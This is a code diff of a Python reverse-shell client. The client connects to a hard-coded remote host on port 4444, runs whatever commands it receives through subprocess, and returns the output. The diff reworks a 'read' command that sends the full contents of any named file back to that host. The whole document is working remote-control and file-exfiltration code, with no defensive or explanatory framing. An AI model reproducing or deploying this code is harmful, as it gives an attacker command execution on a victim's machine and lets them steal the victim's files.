@@ -6,7 +6,7 @@ import sys
 SERVER_HOST = "10.0.1.24"
 #SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 4444
-BUFFER_SIZE = 1024 * 128
+BUFFER_SIZE = 1024
 SEPARATOR = "<sep>"
 
 s = socket.socket()
@@ -18,6 +18,7 @@ s.send(cwd.encode())
 while True:
     command = s.recv(BUFFER_SIZE).decode()
     splitted_command = command.split()
+    #print(command)
 
     if command.lower() == "exit":
         break
@@ -29,19 +30,30 @@ while True:
         else:
             output = ""
     elif splitted_command[0].lower() == 'read':
-        file = splitted_command[1]
-        print(file)
-        if os.path.exists(file) and os.path.isfile(file):
-            s.send("ok".encode("utf-8"))
-            with open(file, "rb") as f:
-                data = f.read()
-            s.send(data)
-            s.send("end".encode("utf-8"))
-        else :
-            s.send("error".encode("utf-8"))
+        file_name = splitted_command[1]
+        
+        file_size = os.path.getsize(file_name)
+        s.send(str(file_size).encode())
+        with open(file_name, "rb") as f:
+            data = f.read()
+        s.send(data)
+        """
+        with open(file_name, "rb") as f:
+            while True:
+                # read the bytes from the file
+                data = f.read(BUFFER_SIZE)
+                if not data:
+                    # file transmitting is done
+                    break
+                # we use sendall to assure transimission in 
+                # busy networks
+                s.send(data)
+        
+        """
+        output = ""
     else:
         output = subprocess.getoutput(command)
-
+    #print(s.)
     cwd = os.getcwd()
     message = f"{output}{SEPARATOR}{cwd}"
     s.send(message.encode())
